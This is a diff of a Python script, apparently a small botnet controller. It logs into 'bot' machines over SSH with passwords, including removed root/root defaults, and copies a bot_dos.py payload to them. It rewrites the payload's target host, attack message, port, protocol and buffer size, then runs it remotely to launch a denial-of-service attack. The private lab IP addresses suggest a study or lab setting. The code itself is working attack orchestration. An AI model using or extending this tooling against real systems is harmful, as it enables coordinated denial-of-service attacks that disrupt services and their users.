@@ -2,17 +2,74 @@ from paramiko import SSHClient
 from scp import SCPClient
 import paramiko
 
+def generate_dos(bot, username, password, script):
+        ssh = SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        # ssh.load_system_host_keys()
+        
+        ssh.connect(hostname=bot, username=username, password=password)
+        stdin, stdout, stderr = ssh.exec_command("python {}".format(script))
+
+        print(stderr.read())
+        print(stdout.read())
+
+        return("break")
+
 def transfer_script(host, username, password, script):
-	ssh = SSHClient()
-	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh = SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     ssh.connect(hostname=host,username=username,password=password)
+    
+    if not username == "root":
+        loc = "/home/{}/{}".format(username, script)
+    else:
+        loc = "/root/{}".format(script)
+    
+    with SCPClient(ssh.get_transport()) as scp:
+        scp.put(script, loc)
 
-    loc = "/home/{}".format(username)
+    return("break")
 
-    with SCPClient(ssh.get_trasport()) as scp:
-    	scp.put(script, loc)
+def create_bot_dos_script(host, attack_message, port, transmission, buffer_size):
+    script = "bot_dos.py"
+    with open(script, "r") as scriptRead:
+        lines = scriptRead.readlines()
 
-host = "192.168.126.129"
-username = "root"
-password = "root"
-script = "bot_dos.py"
+    for line in lines:
+        idx = lines.index(line)
+        lines[idx] = line.rstrip()
+    
+    target = "host = "
+    message = "attack_message = "
+    port_num = "port = "
+    protocol = "transmission = "
+    buff_size = "buffer_size = "
+    
+    for line in lines[0:7]:
+        if target in line:
+            idx = lines.index(line)
+            lines[idx] = target + '"{}"'.format(host)
+
+        if message in line:
+            idx = lines.index(line)
+            lines[idx] = message + '"{}"'.format(attack_message)
+
+        if port_num in line:
+            idx = lines.index(line)
+            lines[idx] = port_num + str(port)
+
+        if protocol in line:
+            idx = lines.index(line)
+            lines[idx] = protocol + '"{}"'.format(transmission)
+
+        if buff_size in line:
+            idx = lines.index(line)
+            lines[idx] = buff_size + str(buffer_size)
+
+    with open(script, "w") as scriptWrite:
+        for line in lines:
+            scriptWrite.write(line + "\n")
+
+    return(script)
+
+# host = 192.168.3.131
